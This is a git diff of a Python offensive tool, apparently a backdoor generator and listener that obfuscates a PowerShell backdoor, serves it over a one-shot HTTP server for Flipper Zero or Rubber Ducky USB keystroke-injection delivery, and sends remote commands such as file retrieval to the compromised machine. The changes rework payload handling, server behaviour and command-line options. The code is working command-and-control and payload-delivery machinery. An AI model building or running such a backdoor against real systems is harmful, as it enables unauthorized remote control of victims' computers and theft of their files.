@@ -9,7 +9,7 @@ from core.payloads import *
 BLOCKSIZE = 65536
 READ_AMOUNT = 50*1024
 
-CWD = os.getcwd() + "/"
+CWD = os.getcwd() + "\\"
 
 # This is used for generating a new name for each 
 # variable and function in the powershell script. 
@@ -52,30 +52,46 @@ class Backdoor:
         payload = None
         if self.config.payload:
             payload = fetch(self.config.payload, self.config)
-        if not payload:
+        if not payload and (self.config.ducky or self.config.flipper):
             return False
+        elif not payload:
+            return True
         self.start_threaded_http_server()
-        return payload.execute()
+        result =  payload.execute()
+        if not result:
+            payload.stop()
+        return result
 
     def create_backdoor(self):
         """ Creates the backdoor file
         """
         if not self.obfuscate_backdoor():
             self.print_verbose_message("Failed to encode backdoor", prefix="-")
-            self.stop()
+            exit()
         hash = get_sha1_file_hash(self.config.out_file)
         self.print_verbose_message(f"Saved backdoor {self.config.out_file} sha1:{hash}")
         if self.config.flipper or self.config.ducky:
-            self.handle_usb_payload()
+            if not self.handle_usb_payload():
+                self.print_verbose_message(f"Failed to process payload: {self.config.payload}", prefix="-")
+                exit()
+
+    def __just_one_please(self):
+        """
+        Processes One HTTP request then quits
+        """
+        # Holds
+        self.httpd.handle_request()
+        print(f"[*] Stopping HTTP server")
+        self.httpd.shutdown()
 
     def start_threaded_http_server(self) -> None:
         """ Creates a thread for a HTTP server hosting our current working directory     
         """
         self.httpd = socketserver.TCPServer(self.config.server_ip_tuple, SimpleHTTPRequestHandler)
-        thread = Thread(target=self.httpd.serve_forever)
+        thread = Thread(target=self.__just_one_please)
         thread.daemon = True
         thread.start()
-        print(f"[*] Started HTTP server hosting directory {self.config.CWD}")
+        print(f"[*] Started HTTP server hosting directory http://{self.config.ip_address}:{self.config.port}/ ")
 
     def start_session(self):
         """ Creates the listener
@@ -117,7 +133,7 @@ class Backdoor:
 
                 if len(command) == 0:
                     command += "ls | Out-Null"
-                    
+
                 time.sleep(.5)
                 connection.sendto(command.encode(), self.config.ip_tuple)
                 if "get_file" in command and "--help" not in command:
@@ -171,21 +187,10 @@ class Backdoor:
                 prefix = f"[{prefix}] "
             print(prefix + message)
 
-    def encode_payload(self) -> bool:
-        """ Encodes the payload.txt into inject.bin
-        1. Requires java
-        2. Requires encode.jar
-        """
-        try:
-            output = get_output(["java", "-jar", f"{CWD}/encoder.jar", "-i", f"{CWD}/payload.txt", "-o", "inject.bin", "-l", self.keyboard_layout])
-        except FileNotFoundError:
-            raise MissingJava
-        return "DuckyScript Complete" in output.decode()
-
     def stop(self):
         """ Stops the TCP listener and ducky-server if started
         """
-        self.sock.shutdown(0)
+        self.sock.close()
 
     def start(self) -> None:
         if not self.config.just_listen_and_host and not self.config.just_listen:
@@ -202,7 +207,6 @@ def main(args) -> None:
         l = Backdoor(config)
         l.start()
     except KeyboardInterrupt:
-        print("1")
         l.stop()
         exit("[*] Backdoor: CTRL+C Detected exiting!")
     except ConnectionResetError as e:
@@ -251,7 +255,7 @@ if __name__ ==  "__main__":
     )
     parser.add_argument(
         "--flipper",
-        help=f"Payload file for flipper zero to connect to the http server (includes EOL conversion) (relative file name)", 
+        help=f"Payload file for flipper zero (includes EOL conversion) (relative file name)", 
     )
     parser.add_argument(
         "--ducky",
@@ -281,15 +285,15 @@ if __name__ ==  "__main__":
         default="us",
     )
     parser.add_argument(
-        "-L",
-        "--just-listen",
+        "-A",
+        "--actually-listen",
         help=f"Just listen for any backdoor connections", 
         default=False,
         action="store_true"
     )
     parser.add_argument(
         "-H",
-        "--just-listen-and-host",
+        "--listen-and-host",
         help=f"Just listen for any backdoor connections and host the backdoor directory", 
         default=False,
         action="store_true"
